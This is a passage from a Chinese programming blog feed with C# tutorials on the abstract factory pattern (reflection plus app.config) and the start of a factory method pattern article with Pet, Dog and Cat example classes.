punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> AccessDepartment类在Access中对Department执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">AccessDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>工厂类</strong>：（DataAccess）</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 使用反射创建操作数据的接口</span>    <span class="token keyword">class</span> <span class="token class-name">DataAccess</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//程序集名称</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> AssemblyName <span class="token operator">=</span> <span class="token string">"抽象工厂模式"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//配置文件中链接的数据名称</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> db <span class="token operator">=</span> ConfigurationManager<span class="token punctuation">.</span>AppSettings<span class="token punctuation">[</span><span class="token string">"DB"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> className <span class="token operator">=</span> AssemblyName <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> db <span class="token operator">+</span> <span class="token string">"User"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//使用发射创建指定类的实例</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>IUser<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>AssemblyName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> className <span class="token operator">=</span> AssemblyName <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> db <span class="token operator">+</span> <span class="token string">"Department"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//使用反射创建指定类的实例</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>IDepartment<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>AssemblyName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>app.config</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&lt;</span>configuration<span class="token operator">></span>    <span class="token operator">&lt;</span>appSettings<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token keyword">add</span> key<span class="token operator">=</span><span class="token string">"DB"</span> <span class="token keyword">value</span><span class="token operator">=</span><span class="token string">"Sqlserver"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>appSettings<span class="token operator">></span><span class="token operator">&lt;</span>startup<span class="token operator">></span><span class="token operator">&lt;</span>supportedRuntime version<span class="token operator">=</span><span class="token string">"v4.0"</span> sku<span class="token operator">=</span><span class="token string">".NETFramework,Version=v4.6.1"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>startup<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>configuration<span class="token operator">></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//实例化对象</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//创建IUser对象，对User执行相关操作</span>            IUser iu <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//创建IDepartment对象，对Department执行相关操作</span>            IDepartment id <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>dept<span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>注</strong>：</p><ul><li>using System.Reflection;                        //使用反射必须要引入的命名空间</li><li>using System.Configuration;                     //拿到配置文件中的字符变量必须要引入的命名空间</li><li>客户端与后端完全解耦</li><li>其他类与工厂类解耦</li><li>添加商品时，只要按模板添加商品类，修改工厂类中的方法即可</li><li>切换数据库接口时，只需修改app.config配置文件即可</li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>反射 + 配置文件 + 抽象工厂</strong>完整代码：</p><p><strong>Program.cs</strong>:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/******************************************************** * 设计模式：抽象工厂模式，（反射+配置文件+抽象工厂） *  * 反射： *       return (IUser)Assembly.Load(AssemblyName).CreateInstance(className); *       AssemblyName：为本程序集名称 *       className：为程序集中要实例化的类的名称（完整路径） *       (IUser)：将创建的对象强制转化为IUser对象 *  * 配置文件信息： *       使用&lt;appStrings>节点来设置链接的数据库名称 *  */</span><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//使用反射必须要引入的命名空间</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">//拿到配置文件中的字符变量必须要引入的命名空间</span><span class="token keyword">namespace</span> 抽象工厂模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//实例化对象</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//创建IUser对象，对User执行相关操作</span>            IUser iu <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//创建IDepartment对象，对Department执行相关操作</span>            IDepartment id <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>dept<span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试基类</span>    <span class="token keyword">class</span> <span class="token class-name">User</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Department</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _deptName<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> DeptName        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _deptName<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _deptName <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> User类的数据操作接口</span>    <span class="token keyword">interface</span> <span class="token class-name">IUser</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">;</span>        User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> SqlserverUser类在SQL Server中对User执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> AccessUser类在Access中对User执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">AccessUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> Department类的数据操作接口</span>    <span class="token keyword">interface</span> <span class="token class-name">IDepartment</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span><span class="token punctuation">;</span>        Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> SqlserverDepartment类在SQL Server中对Department执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> AccessDepartment类在Access中对Department执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">AccessDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 使用反射创建操作数据的接口</span>    <span class="token keyword">class</span> <span class="token class-name">DataAccess</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//程序集名称</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> AssemblyName <span class="token operator">=</span> <span class="token string">"抽象工厂模式"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//配置文件中链接的数据名称</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> db <span class="token operator">=</span> ConfigurationManager<span class="token punctuation">.</span>AppSettings<span class="token punctuation">[</span><span class="token string">"DB"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> className <span class="token operator">=</span> AssemblyName <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> db <span class="token operator">+</span> <span class="token string">"User"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//使用发射创建指定类的实例</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>IUser<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>AssemblyName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> className <span class="token operator">=</span> AssemblyName <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> db <span class="token operator">+</span> <span class="token string">"Department"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//使用反射创建指定类的实例</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>IDepartment<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>AssemblyName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span><span class="token punctuation">}</span></code></pre><p><strong>App.config</strong>文件：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&lt;</span>configuration<span class="token operator">></span>    <span class="token operator">&lt;</span>appSettings<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token keyword">add</span> key<span class="token operator">=</span><span class="token string">"DB"</span> <span class="token keyword">value</span><span class="token operator">=</span><span class="token string">"Sqlserver"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>appSettings<span class="token operator">></span><span class="token operator">&lt;</span>startup<span class="token operator">></span><span class="token operator">&lt;</span>supportedRuntime version<span class="token operator">=</span><span class="token string">"v4.0"</span> sku<span class="token operator">=</span><span class="token string">".NETFramework,Version=v4.6.1"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>startup<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>configuration<span class="token operator">></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 抽象工厂模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工厂方法模式</title>
      <link href="/2020/08/22/gong-han-fang-fa-mo-shi/"/>
      <url>/2020/08/22/gong-han-fang-fa-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        工厂方法模式（Factory Method Pattern）属于<strong>类的创建型模式</strong>，是通过专门定义一个类来负责创建其他类的实例，被创建的实例通常都具有共同的父类。包含<strong>简单工厂模式</strong>、<strong>多工厂方法模式</strong>、<strong>静态工厂方法模式</strong>三种模式。（<font color="blue">通俗一点：就是定义一个工厂类(接口)专门来生产商品对象。</font>）</p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><p>该模式由三种角色组成：</p><ul><li><p><strong>工厂角色</strong>(Creator)：</p><p>​        简单工厂模式的核心，它负责实现创建所有实例的<strong>内部逻辑</strong>。工厂类的创建产品类的方法<strong>可以被外界直接调用</strong>，创建所需的产品对象。</p></li><li><p><strong>抽象产品角色</strong>(Product)：</p><p>​        简单工厂模式所创建的所有对象的父类，它负责描述所有实例所<strong>共有的公共接口</strong>。</p></li><li><p><strong>具体产品角色</strong>(Concrete Product)：</p><p>​        是简单工厂模式的创建目标，所有创建的对象都是充当这个角色的某个具体类的实例。</p></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ul><li>将指定的参数送入工厂类中，</li><li>按一定的条件产出一个实例对象，</li><li>并通过多态返回实例化的对象</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/工厂方法模式/工厂方法.png" alt="工厂方法"></center><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><h2 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a><strong>简单工厂模式</strong></h2><p>​        简单工厂模式的工厂类中<strong>只有一个创建商品的方法</strong>。</p><p><strong>简单工厂模式UML类图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/工厂方法模式/简单工厂方法模式类图.png" alt="简单工厂方法模式类图"></center><p><strong>抽象产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 用于实例化工厂方法模式的基类（其一般为接口）</span>    <span class="token comment" spellcheck="true">/// 1、若为接口，则只能定义商品所具有的行为，且继承于该接口的类必须对其进行实现</span>    <span class="token comment" spellcheck="true">/// 2、若为类，一般将其定义为抽象类，</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类的创建</span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类--接口形式展示</span>    <span class="token comment" spellcheck="true">// 本实例中使用的基类</span>    <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Pet</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//商品的行为（方法）   --只有方法体</span>        <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类--抽象类形式展示</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Product</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//必须声明为抽象方法</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">string</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>具体产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体商品类对基类的继承与扩展</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对接口中方法的实现</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Bow Bow..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 具体商品类的扩展</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> color<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetColor</span><span class="token punctuation">(</span><span class="token keyword">string</span> color<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Meaw Meaw..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>工厂角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor 